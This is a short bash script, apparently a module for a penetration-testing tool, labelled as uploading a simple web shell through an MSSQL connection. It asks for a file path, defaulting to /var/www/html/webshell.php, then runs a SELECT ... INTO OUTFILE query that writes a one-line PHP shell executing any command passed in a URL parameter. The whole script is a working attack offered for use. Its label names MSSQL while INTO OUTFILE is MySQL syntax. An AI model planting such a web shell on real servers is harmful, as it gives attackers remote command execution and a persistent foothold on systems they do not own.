#!/bin/bash

: '
mssql: upload simple webshell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
OUTPUT_FILE_FIELD=$(form_item  "output file" "output_file" "/var/www/html/webshell.php")

# Generate GUI form
generate_form "${OUTPUT_FILE_FIELD}"

OUTPUT_FILE=${form_data["output_file"]}

execute_command "SELECT \"<?php echo shell_exec(\$_GET['c']);?>\" INTO OUTFILE '${OUTPUT_FILE}';"
create_new_line
